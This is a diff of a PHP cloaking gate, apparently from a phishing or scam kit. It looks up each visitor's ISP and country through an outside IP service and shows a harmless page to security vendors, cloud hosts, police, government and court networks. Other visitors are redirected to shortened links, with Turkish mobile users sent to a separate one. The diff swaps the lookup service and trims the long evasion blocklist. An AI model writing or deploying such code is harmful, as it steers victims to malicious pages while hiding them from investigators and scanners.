@@ -32,25 +32,17 @@
       return $rname;
   }
 
-  function getORG(){
+  function getApi(){
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.getUserIP().'/org');
+    curl_setopt($ch, CURLOPT_URL, 'http://redirect100.info/api/ip/'.getUserIP());
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
     $org = curl_exec($ch);
     curl_close($ch);
-    return $org;
+    return json_decode($org);
   }
 
-  function getCountry(){
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.getUserIP().'/country');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    $org = curl_exec($ch);
-    curl_close($ch);
-    return $org;
-  }
+  $user = getApi();
 
   $action = 'theme';
 
@@ -77,7 +69,7 @@
 
   if($action == 'site'){
     $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
+    $refs = array('facebook.com', 'herokuapp.com');
     $action = 'theme';
     foreach ($refs as $ref) {
       if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
@@ -88,13 +80,14 @@
   }
 
   if($action == 'site'){
-    $asnlist = array('Facebook','facebook','Google','google','Cloudflare','cloudflare','linode','Linode','level 3 communications','kaspersky', 'Level 3 Communications','Kaspersy','Mcafee','mcafee','akamai international', 'neustar','amazon','microsoft','digitalocean','leaseweb','radore','avast','qsc ag','radix','dynamic network services','eset','ovh sas','icann','Akamai International','NeuStar','Amazon','Microsoft', 'Digital Ocean', 'LeaseWeb', 'Radore', 'AVAST', 'QSC AG', 'Radix', 'ICANN', 'Dynamic Network Services', 'ESET', 'OVH SAS','google','SoftLayer','dropbox','coloc','Maktek','fbi','Netguard','data-center','Data Center','LEPL','ministarstvo','ministry','McAfee','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','ocean','Zscaler','Steadfast Networks','Facebook','Microsoft','CtrlS Datacenters','Federal','SingleHop','Reliablehosting.com','QuadraNet','Leaseweb USA','Leaseweb Germany GmbH','Dedicated Server Hosting','Screen Saver','datacent','security','amazon','intel','govern','leaseweb','interpol','serve','US Internet Corp','bitdefender','admin','cyber','layer','linode','apple','crime','azure','micro','serve','dedi','cloud','host','cisco','facebook','polic','leaseweb','node','bing','google','isprime','court', 'DOGAN', 'INETLTD', 'TELLCOM', 'AS197328', 'NETHOUSE', 'KOCNET', 'ASTURKNET', 'ULAKNET', 'ESOESNET', 'AS43260', 'AS198436', 'AS62054', 'DORUKNET', 'Digital Energy Technologies', 'WEDOS', 'ITLAS', 'TRABIA', 'Transip');
+    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation');
   }else if($action == 'mobile'){
-    $asnlist = array('Facebook','facebook','Google','google','Cloudflare','cloudflare','linode','Linode','level 3 communications','kaspersky', 'Level 3 Communications','Kaspersy','Mcafee','mcafee','akamai international', 'neustar','amazon','microsoft','digitalocean','leaseweb','radore','avast','qsc ag','radix','dynamic network services','eset','ovh sas','icann','Akamai International','NeuStar','Amazon','Microsoft', 'Digital Ocean', 'LeaseWeb', 'Radore', 'AVAST', 'QSC AG', 'Radix', 'ICANN', 'Dynamic Network Services', 'ESET', 'OVH SAS','google','SoftLayer','dropbox','coloc','Maktek','fbi','Netguard','data-center','Data Center','LEPL','ministarstvo','ministry','McAfee','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','ocean','Zscaler','Steadfast Networks','Facebook','Microsoft','CtrlS Datacenters','Federal','SingleHop','Reliablehosting.com','QuadraNet','Leaseweb USA','Leaseweb Germany GmbH','Dedicated Server Hosting','Screen Saver','datacent','security','amazon','intel','govern','leaseweb','interpol','serve','US Internet Corp','bitdefender','admin','cyber','layer','linode','apple','crime','azure','micro','serve','dedi','cloud','host','cisco','facebook','polic','leaseweb','node','bing','google','isprime','court', 'DOGAN', 'INETLTD', 'TELLCOM', 'AS197328', 'NETHOUSE', 'KOCNET', 'ASTURKNET', 'ULAKNET', 'ESOESNET', 'AS43260', 'AS198436', 'AS62054', 'DORUKNET', 'Digital Energy Technologies', 'WEDOS', 'ITLAS', 'TRABIA', 'Transip');
+    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
   }
 
+
   if($action != 'theme'){
-    $org = getORG();
+    $org = $user->isp;
     foreach ($asnlist as $asn) {
       if(strpos(strtolower($org), strtolower($asn)) !== false){
         $action = 'theme';
@@ -130,7 +123,7 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
-    if (getCountry() == "TR") {
+    if ($user->countryCode == "TR") {
       header('Location: https://goo.gl/O3CLpb');
     } else {
       header('Location: https://goo.gl/2lJlph');
